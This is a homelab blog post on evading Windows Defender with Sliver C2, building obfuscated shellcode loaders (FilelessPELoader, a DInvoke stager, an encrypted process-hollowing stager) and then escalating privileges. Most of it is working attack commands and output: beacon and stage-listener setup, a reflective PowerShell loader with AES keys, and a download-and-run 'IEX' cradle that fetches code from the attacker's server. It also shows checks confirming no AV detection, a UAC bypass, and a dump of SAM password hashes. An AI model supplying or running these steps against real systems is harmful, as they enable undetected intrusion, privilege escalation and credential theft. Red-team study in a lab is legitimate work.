---
layout: blog
title:  "Anti-Virus Evasion with Sliver C2"
seo_title: "Using DInvoke and Sliver C2 beacons to evade Anti-Virus and Escalate Privileges"
date:   2025-01-04T09:00
categories: ['Maldev', 'Windows', 'Homelab']
---

![](/assets/images/headers/Sliver-Purple.jpg)

# Sliver C2

My recent exploration into C2 frameworks led me to BishopFox's [Sliver](https://github.com/BishopFox/sliver) project. While its capabilities are impressive, I quickly encountered a common challenge: Windows Defender's detection of beacon payloads on my Windows VM. In order to enhance my red teaming skills, I decided to dig into leveraging a custom stager, [DInvoke](https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main) and [FilelessPELoader](https://github.com/SaadAhla/FilelessPELoader), together with common evasion techniques for building my own Sliver shellcode loader.

## What is a shellcode loader?
A shellcode loader is a small piece of executable code designed to, as its name would suggest, load and execute shellcode (being a larger payload) into a target process's memory. Think of it as the initial delivery mechanism. Shellcode loaders often go along with techniques like process injection, allowing attackers to run arbitrary code within a legitimate process, that bypass traditional security controls focused on executable files on disk.

The loader will act as a **Stage 1** payload (e.g. `stager.txt`). Its primary purpose is to establish communication with a command and control (C2) or payload server and download the larger, more feature-rich (and often encrypted) **Stage 2** payload. The second stage payload is the main malicious code that we as an attacker intend to execute on the target system. 

![Stager diagram](/assets/images/maldev/stager-diagram.png)

For this blog post our final payload will be a Sliver beacon. The goal is to create a stager with the following properties:
1. Natively supported by Windows without too much dependencies.
2. Bypass common defenses found on modern operating systems (e.g. signature checks).
3. Use commonly whitelisted protocols in order to bypass firewall rules and fit in with normal traffic (e.g. web traffic).

## Sliver Setup

!!!info
For more information on installing and using Sliver, see the [official wiki](https://sliver.sh/docs?name=Linux+Install+Script).
!!!

From Sliver v1.5 you can make extensive customizations to the HTTP C2 traffic generated by the server and implant by modifying the HTTP C2 configuration file, which by default is located at `~/.sliver/configs/http-c2.json`. To be able to blend in more with normal traffic, I made some minor modifications to this file.

Next, we can generate our HTTPS beacon shellcode with basic obfuscation features enabled.

```console
$ sudo ./sliver-server_linux
[server] sliver > generate beacon -b https://192.168.129.40 -e -f shellcode -N rev --seconds 30 --jitter 3 --os windows -s /tmp

[*] Generating new windows/amd64 beacon implant binary (30s)
[*] Symbol obfuscation is enabled
[*] Build completed in 10s
[*] Encoding shellcode with shikata ga nai ... success!
[*] Implant saved to /tmp/rev.bin
```

This command will save the shellcode for our Sliver beacon in `/tmp/rev.bin`. If you want to generate an executable (default) that will be executed on the target we can use do this as well. After generating the beacon, we start an mTLS listener.

![Generating a Sliver beacon and listener](/assets/images/maldev/sliver-setup1.png)

We can convert the executable to a `.bin` file with [Donut](https://github.com/TheWover/donut). Donut is a tool focused on creating binary shellcodes that can be executed in memory. Its primary strength lies in its ability to convert executables (.exe), dynamic-link libraries (.dll), .NET assemblies, VBScript, and JScript into shellcode. This shellcode can then be injected into a running process, allowing for fileless execution of malicious payloads. I'll use Donut with the `-b 1` flag to not add AMSI bypass and the `-e 3` flag for encryption.

```console
$ ./donut -b 1 -e 3 -o rev.bin -i /tmp/ESSENTIAL_THEATER.exe 

  [ Donut shellcode generator v1 (built Dec 26 2024 11:15:37)
  [ Copyright (c) 2019-2021 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : "/tmp/SHORT_JODHPURS.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : EXE
  [ Target CPU    : x86+amd64
  [ AMSI/WDLP/ETW : none
  [ PE Headers    : overwrite
  [ Shellcode     : "/tmp/rev.bin"
  [ Exit          : Thread
```

The idea is that our final stager will grab this binary shellcode file and execute it in memory. There are plenty of existing PE loaders to perform Process Injection into a target process. However, as a learning experience I wanted to create my own loaders.

## Method 1: FilelessPELoader (C++)
[FilelessPELoader](https://github.com/SaadAhla/FilelessPELoader) enables the loading and execution of Portable Executable files directly from memory, avoiding disk writes. It also encorporates AES encryption and decryption of the shellcode in memory to further enhance obfuscation.

In order to evade detection, we will need to make our hands dirty and use manual obfuscation techniques. These include string encryption, control flow obfuscation, instruction substitution, and anti-analysis measures. We can either use [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) or [DefenderCheck](https://github.com/matterpreter/DefenderCheck) to see if our executable gets picked up by Anti-Virus. 

Let's first clone the project and compile our binary without any modifications.

![FilelessPELoader (No obuscation)](/assets/images/maldev/FilelessPELoader-1.png)

From the above output, we can see that ThreatCheck has identified some bad bytes that are detected by our AV. To fix this I removed all comments, any unnecessary print statements or functions, and reversed several function names. I am not going into detail on how to obfuscate the code, since it should be relatively easy to bypass any signature checks.

![FilelessPELoader (Ofbuscated)](/assets/images/maldev/FilelessPELoader-2.png)

The project comes with a custom `aes.py` script that can be used to encrypt any file we want. Running the script will generate two files.

```console
$ python aes.py 
Usage: python aes.py PAYLOAD_FILE

$ python aes.py ESSENTIAL_THEATER.exe
$ ls
aes.py cipher.bin key.bin ESSENTIAL_THEATER.exe
```

The idea is that our loader will fetch the encrypted binary (`cipher.bin`) together with a key (`key.bin`) in order to decrypt it. The generated files can be passed to our loader as arguments.

### FilelessPELoader Execution
Now we can try running our modified **FilelessPELoader** executable.

!!!info Note
Don't forget to specify the IP and PORT as well as the encrypted payload and key files as arguments.
!!!

```console
$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

PS C:\> .\FilelessPELoader.exe 192.168.129.40 8080 cipher.bin key.bin
```

![FilelessPELoader Sliver Beacon](/assets/images/maldev/sliver-FilelessPELoader.png)

The only problem with this method is that the process will keep on running until it is exited by the user. It also shows up in task manager, which is not very stealthy.

## Method 2: DInvoke Stager (.NET)
To build a more stealthy stager, I decided to make use of DInvoke by [TheWover](https://github.com/TheWover). Using DInvoke, we can use Dynamic Invocation to load unmanaged code via DLLs at runtime. The traditional way (using PInvoke) involves the program declaring beforehand which functions it will use, and the operating system helps to link them up. Dynamic Invocation, on the other hand, looks up the address of a function in memory at the exact moment you need it, rather than declaring it beforehand. This makes it harder for analysis since traditional tools will monitor these pre-declared links to see what the program is doing.

DInvoke helps us to avoid API Hooking by calling arbitrary code from memory, while also avoiding detections that look for imports of suspicious API calls via the Import Address Table. For more information about the DInvoke project, be sure to read [TheWover's blog post](https://thewover.github.io/Dynamic-Invoke/) where he demonstrates how the project works.

In order to make use of DInvoke as a shellcode loader, I made a few modifications to an existing project of [Kara-4search](https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main). I changed the original code in order to download the shellcode from a web server and then load it into memory. The applied changes can be seen below.

![DInvoke Loader (adapted)](/assets/images/maldev/DInvoke-Loader-1.png)

### Obfuscation with InvisibilityCloak
After making those minor adjustments to the shellcode loader, the next step is to make it harder to get detected by traditional Anti-Virus by doing code obfuscation. The [InvisibilityCloak](https://github.com/h4wkst3r/InvisibilityCloak) project provides a user-friendly set of tools to quickly make modifications to your project. This toolkit can perform actions such as renaming the project files, changing its unique identifier (GUID), scrambling the text strings within the code, removing any developer comments, and stripping out debugging information stored in program database (PDB) files. 

Clone the project, compile the binary and run the command below in order to rename the project and apply string reversing as the obfuscation method.

```console
C:\Tools\Python\InvisibilityCloak> python.exe InvisibilityCloak.py -d C:\Tools\DInvoke_Loader\DInvoke_shellcodeload -n "s3rp3nt" -m reverse
,                 .     .   .        ,-. .         ,
|         o     o |   o | o |       /    |         |
| ;-. . , . ,-. . |-. . | . |-  . . |    | ,-. ,-: | ,
| | | |/  | `-. | | | | | | |   | | \    | | | | | |<
' ' ' '   ' `-' ' `-' ' ' ' `-' `-|  `-' ' `-' `-` ' `
                                        `-'
====================================================
[*] INFO: String obfuscation method: reverse
[*] INFO: Directory of C# project: C:\Tools\DInvoke_Loader\DInvoke_shellcodeload
[*] INFO: New tool name: s3rp3nt
====================================================

[*] INFO: Generating new GUID for C# project
[*] INFO: New project GUID is 1465ec05-f1b9-48e2-af4a-442f974e22a1
[*] INFO: Changing C# project GUID in below files:
C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_shellcodeload.sln
C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\DInvoke_shellcodeload.csproj
C:\Tools\DInvoke_Loader\DInvoke_shellcodeloadDInvoke_test\Properties\AssemblyInfo.cs_copy


[*] INFO: Removing PDB string in C# project file

[*] INFO: Renaming DInvoke_shellcodeload.sln to s3rp3nt.sln
[*] INFO: Renaming DInvoke_shellcodeload.csproj to s3rp3nt.csproj
[*] INFO: Renaming directory DInvoke_shellcodeload to s3rp3nt

[+] SUCCESS: New GUID of 1465ec05-f1b9-48e2-af4a-442f974e22a1 was generated and replaced in your project
[+] SUCCESS: New tool name of s3rp3nt was replaced in project

[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvokeFunctions.cs
[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\DELEGATES.cs
[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\DInvokeFunctions.cs
[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\Program.cs
[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\obj\x64\Debug\.NETFramework,Version=v4.7.2.AssemblyAttributes.cs
[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\obj\x64\Release\.NETFramework,Version=v4.7.2.AssemblyAttributes.cs
[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\obj\x86\Debug\.NETFramework,Version=v4.7.2.AssemblyAttributes.cs

[+] SUCCESS: Your new tool s3rp3nt now has the invisibility cloak applied.
```

From the output we see that we have succesfully obfuscated the project. Before compiling, let's change all string references of DInvoke to another custom string (e.g. "s3rp3nt"). We will also change the project output type to be a Windows Application in order to avoid a console pop-up when executing the binary.

![DInvoke loader](/assets/images/maldev/DInvoke-Loader-2.png)

### AV Check
With our loader ready, we can verify if our file is not getting detected as malicious by running [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) or [DefenderCheck](https://github.com/matterpreter/DefenderCheck).

```powershell
C:\Tools> DefenderCheck.exe s3rp3ntLoader.exe
Target file size: 8192 bytes
Analyzing...

Exhausted the search. The binary looks good to go!

C:\Tools\ThreatCheck\bin\Release> ThreatCheck.exe -f C:\Tools\s3rp3ntLoader.exe
[+] No threat found!
```

### DInvoke Execution
Now with everything set lets try to get a beacon from our victim machine. First convert the beacon executable to binary shellcode format if you haven't already (see Donut example above).

![Sliver DInvoke Loader](/assets/images/maldev/sliver-execution.png)

After executing our custom shellcode loader, we can see it has grabbed our beacon file from our Python server (`rev.bin`), loaded the shellcode in memory and connected to our server without alerting Windows Defender. You see that I get a couple of beacon connections, because I ran the executable a couple of times.

## Method 3: Custom Encrypted Stager
Now Sliver has actually built-in support for custom stagers making use of encryption and compression when serving stages. First we need to setup our profile, listener, and stage listener with the following command:

```console
$ sudo ./sliver-server_linux
[server] sliver > profiles new -b https://192.168.129.40:443 --skip-symbols --format shellcode --arch amd64 s3rp3nt
[server] sliver > https -L 192.168.129.40 -l 443
[server] sliver > stage-listener --url https://192.168.129.40:8443 --profile s3rp3nt -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV
```

![Sliver Stager Setup](/assets/images/maldev/sliver-stager-setup.png)

By making some modifications to their [Encrypted Stage Example](https://sliver.sh/docs?name=Stagers) code, we can add additional functionality to inject our shellcode into a running process by using a techniques called **Process Hollowing**.

!!!info
Process hollowing is a technique to execute code under the guise of a legitimate process. It works by creating a new process in a suspended state, typically a benign system executable like `svchost.exe`, and then unmapping or "hollowing out" its original memory. We can then inject our own malicious code into this memory space and resume the process, making it appear as though the legitimate process is running.
!!!

Just as before, we can use InvisibilityCloak on the project from [Cyb3rDudu](https://github.com/Cyb3rDudu/SliverLoader/tree/main). This project makes use of the Sliver encrypted stager incorporating AMSI bypass, process injection, hollowing and much more. We can compile the project in `Release Mode` and convert the DLL to raw bytes.

```powershell
PS C:\Tools\Python\InvisibilityCloak> python InvisibilityCloak.py -d C:\Tools\SliverLoder-main\SliverLoader -n 'serpent' -m reverse
PS C:\Tools\SliverLoder-main\serpent\bin\Release> get-content -encoding byte -path .\serpent.dll | clip
```

Convert the raw bytes to Base64 with a [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Line%20feed',false)To_Base64('A-Za-z0-9%2B/%3D')).

![SliverLoader Base64 Recipe](/assets/images/maldev/loader-base64.png)

Next convert the AESKey and AESIV to hex using another [CyberChef recipe](https://cyberchef.io/#recipe=To_Hex('0x%20with%20comma',0)).

![SliverLoader AESkey Recipe](/assets/images/maldev/loader-aeskey-recipe.png)

Copy the Base64 data and paste it into a PowerShell script.

```powershell
$encodeStr = "TVqQAAMAAAAEAAAA...<SNIP>"

[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($encodeStr))
$url = "https://192.168.129.40:8443/test.woff"
$TargetBinary = "svchost.exe"
[byte[]]$AESKey = 0x44,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56,0x6d,0x59,0x71,0x33,0x74
[byte[]]$AESIV = 0x38,0x79,0x2f,0x42,0x3f,0x45,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56

$CompressionAlgorithm = "deflate9"
[serpent.Loader]::DownloadAndExecute($url,$TargetBinary,$CompressionAlgorithm,$AESKey,$AESIV)
```

This script is a PowerShell loader that is hosted on our server, intented to be downloaded and executed once an attacker gains code execution. The script will load the stager into memory via reflection and performs the `DownloadAndExecute` operation that downloads our Sliver agent from our payload server and executes it.

### Encrypted Stager Execution
Our PowerShell loader can be hosted on a webserver as a normal file. On the victim, the following command executes the download and staging of the agent which will result in an incoming session in sliver.

```powershell
PS C:\> (New-Object System.Net.WebClient).DownloadString('http://192.168.129.40/README.md') | IEX
```

In a minute we should get a session in Sliver without Defender stopping us.

![Sliver Session](/assets/images/maldev/sliver-session.png)

## Privilege Escalation
Since we now have an active beacon on our target, we can even go a step further and escalate privileges on the host.
Use one of the beacons and run `sa-whoami` (installed via armory). This will run a `whoami /all` in a more safe way.

```console
[server] sliver (ESSENTIAL_THEATER) > sa-whoami 

[*] Tasked beacon ESSENTIAL_THEATER (f91cc40c)

[+] ESSENTIAL_THEATER completed task f91cc40c

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName        SID
====================== ====================================
DESKTOP-3GMRMMT\John    S-1-5-21-2723216276-469661999-718104327-1001


GROUP INFORMATION                                 Type                     SID                                          Attributes               
================================================= ===================== ============================================= ==================================================
DESKTOP-3GMRMMT\None                              Group                    S-1-5-21-2723216276-469661999-718104327-513   Mandatory group, Enabled by default, Enabled group, 
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\Local account and member of Administrators groupWell-known group         S-1-5-114                                     
DESKTOP-3GMRMMT\docker-users                      Alias                    S-1-5-21-2723216276-469661999-718104327-1002  Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  
BUILTIN\Performance Log Users                     Alias                    S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group, 
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group, 
CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\Local account                        Well-known group         S-1-5-113                                     Mandatory group, Enabled by default, Enabled group, 
LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group, 
Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group, 


Privilege Name                Description                                       State                         
============================= ================================================= ===========================
SeShutdownPrivilege           Shut down the system                              Disabled                      
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
SeUndockPrivilege             Remove computer from docking station              Disabled                      
SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled                      
SeTimeZonePrivilege           Change the time zone                              Disabled
```

We see our user is part of the `Administrators` group but we are not in a high integrity process. This means that we have to bypass UAC (User Access Control) to get a shell with full Administrator privileges. There is an excellent project called [UAC-BOF-Bonanza](https://github.com/icyguider/UAC-BOF-Bonanza) that includes Beacon Object Files that can be loaded to Sliver in order to bypass UAC. After cloning the repository, we can load them into Sliver as follows (e.g. `CmstpElevatedCOM`):

```console
$ git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
$ cp UAC-BOF-Bonanza/CmstpElevatedCOM/ /home/s3rp3nt/.sliver-client/extensions/
```

The above UAC Bypass creates an elevated `ICMLuaUtil COM` object and calls its ShellExec function to execute the provided file on disk. If it is the first time using these custom extension, restart the Sliver server. We can now run the `CmstpElevatedCom` task from within our beacon that executes our loader.

![Sliver Privesc](/assets/images/maldev/sliver-privesc.png)

This will launch another beacon process running as Administrator. With these privileges we can try to dump all credentials from LSASS. To stay stealthy, let's use [SharpSAMDump](https://github.com/jojonas/SharpSAMDump).

```console
[server] sliver (ESSENTIAL_THEATER) > execute-assembly -i /home/s3rp3nt/Tools/Windows/SharpSAMDump.exe

[*] Tasked beacon ESSENTIAL_THEATER (c4af87ff)

[+] ESSENTIAL_THEATER completed task c4af87ff

[*] Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
John:1001:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

We managed to obtain the hashes of all accounts on the machine, including the administrator hash.
